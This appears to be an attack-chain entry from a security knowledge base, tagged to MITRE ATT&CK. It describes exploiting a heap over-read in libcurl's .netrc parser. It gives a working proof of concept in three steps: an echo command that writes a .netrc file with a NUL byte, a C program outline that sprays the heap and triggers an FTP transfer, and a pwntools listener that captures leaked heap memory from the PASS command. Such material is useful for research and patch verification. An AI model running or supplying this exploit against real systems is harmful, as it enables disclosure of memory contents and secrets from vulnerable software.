---
tags:
  - libcurl
  - heap-over-read
  - information-disclosure
  - netrc
  - exfiltration
  - ftp
type: attack_chain
tools:
  - '[[tools/bash]]'
  - '[[tools/gcc]]'
  - '[[tools/python3]]'
  - '[[tools/pwntools]]'
tactics:
  - '[[Collection]]'
  - '[[Exfiltration]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Malicious-netrc-File-with-NUL-Byte]]'
  - '[[procedures/Trigger-libcurl-Vulnerability-with-C-Program]]'
  - '[[procedures/Capture-Leaked-Data-via-FTP-Server]]'
step_count: 3
techniques:
  - '[[Data from Local System]]'
  - '[[Exfiltration Over Command and Control Channel]]'
updated_at: '2025-12-14T17:25:13.327Z'
description: >-
  A multi-stage attack exploiting a heap over-read vulnerability in libcurl's
  parsenetrc() function by crafting a malicious .netrc file, triggering the
  parser to leak adjacent heap memory, and exfiltrating the data over FTP to an
  attacker-controlled server.
id: 231e3bf9-eb38-4e68-8643-5cdfc0ebb8c9
validated: true
mitre_tactics:
  - '[[Collection]]'
  - '[[Exfiltration]]'
mitre_techniques:
  - '[[Data from Local System]]'
  - '[[Exfiltration Over Command and Control Channel]]'
---
# libcurl Heap Over-Read via Malicious .netrc File for Sensitive Data Disclosure

Multi-stage attack chain demonstrating exploitation of a heap over-read in libcurl's .netrc parser to disclose sensitive heap memory over the network.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare Malicious .netrc] --> B[Trigger libcurl Parse] --> C[Exfiltrate via FTP]
    A:::red
    B:::orange
    C:::green

    classDef red fill:#e74c3c
    classDef orange fill:#f39c12
    classDef green fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/bash]]
- [[tools/gcc]]
- [[tools/python3]]
- [[tools/pwntools]]

### Target Environment

- Linux platform with libcurl installed
- Access to compile and run C programs using libcurl
- Port 1337 available for FTP listener

### Initial Access Requirements

- Local access to the target system to create files and execute programs
- No network credentials required beyond local file write permissions

## Detailed Attack Procedures

### Step 1: Prepare Malicious .netrc File

procedure: [[procedures/Create-Malicious-netrc-File-with-NUL-Byte]]

**Objective**: Craft a .netrc file with a NUL byte in the password token to cause the parsenetrc() function to over-read heap memory.

**Instructions**: Use [[commands/echo-create-malicious-netrc]] to generate the proof-of-concept file:

```bash
echo -en 'machine 127.0.0.1 login username password\x00 nothing-suspicious-here\n' > poc.txt
```

**Expected Output**: A file `poc.txt` containing the malicious line that embeds a NUL byte (`\x00`) in the password field.

**Success Indicators**:
- File `poc.txt` created successfully
- Verify contents with `cat -v poc.txt` showing the NUL as `^@`

### Step 2: Trigger Vulnerability in libcurl

procedure: [[procedures/Trigger-libcurl-Vulnerability-with-C-Program]]

**Objective**: Pre-populate the heap with known data and use libcurl to parse the malicious .netrc file, causing the over-read during an FTP transfer attempt.

**Instructions**: Compile a C program that sprays the heap with 'A's (e.g., allocate and free a 32KB buffer), sets libcurl options for the .netrc file (`CURLOPT_NETRC_FILE` to `./poc.txt` and `CURLOPT_NETRC_REQUIRED`), and attempts a transfer to `ftp://127.0.0.1:1337/`. Use [[tools/gcc]] for compilation:

```bash
gcc -o exploit exploit.c -lcurl
./exploit
```

The C code should include heap spraying like `char *buf = malloc(32768); memset(buf, 'A', 32768); free(buf);` followed by curl initialization and `curl_easy_setopt(curl, CURLOPT_URL, "ftp://127.0.0.1:1337/"); curl_easy_perform(curl);`.

**Expected Output**: libcurl parses the .netrc, over-reads heap data into the password field, and sends it in the FTP PASS command.

**Success Indicators**:
- Program compiles without errors
- curl_easy_perform() executes, attempting FTP connection
- No immediate crash, but heap data leaked in network traffic

### Step 3: Capture and Analyze Leaked Data

procedure: [[procedures/Capture-Leaked-Data-via-FTP-Server]]

**Objective**: Listen for the FTP connection from the libcurl program and capture the leaked heap contents sent as the password.

**Instructions**: Run the Python FTP server script using [[commands/python3-run-poc-ftp-server]] and [[tools/pwntools]] to handle FTP protocol on port 1337:

```bash
python3 server.py
```

The script should use pwntools to listen on TCP port 1337, respond to USER with 331, receive PASS, and print the password line containing over-read data like 'PASS AAAAAAAAAAAAAA'.

**Expected Output**: Console output showing the received PASS command with leaked heap data, e.g., `b'PASS AAAAAAAAAAAAAA\r\n'`.

**Success Indicators**:
- Server starts listening on port 1337
- Receives FTP connection and prints leaked password containing heap contents (e.g., 'A's or pointers/secrets)
- Data disclosure confirmed, potentially including uninitialized memory or ASLR-defeating addresses

## Attack Chain Summary

### Key Achievements

1. Successful creation of a malicious .netrc file triggering the heap over-read in libcurl's token parsing loop.
2. Heap spraying and libcurl execution to force disclosure of adjacent memory.
3. Network exfiltration of sensitive heap data via FTP, enabling further attacks like ASLR bypass or secret leakage.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Data from Local System]] Data from Local System
- [[Exfiltration Over Command and Control Channel]] Exfiltration Over C2 Channel Using Interactive Command

### MITRE ATT&CK Tactics

- [[Collection]] Collection
- [[Exfiltration]] Exfiltration

---

*Last updated: 2023-10-01T00:00:00Z*
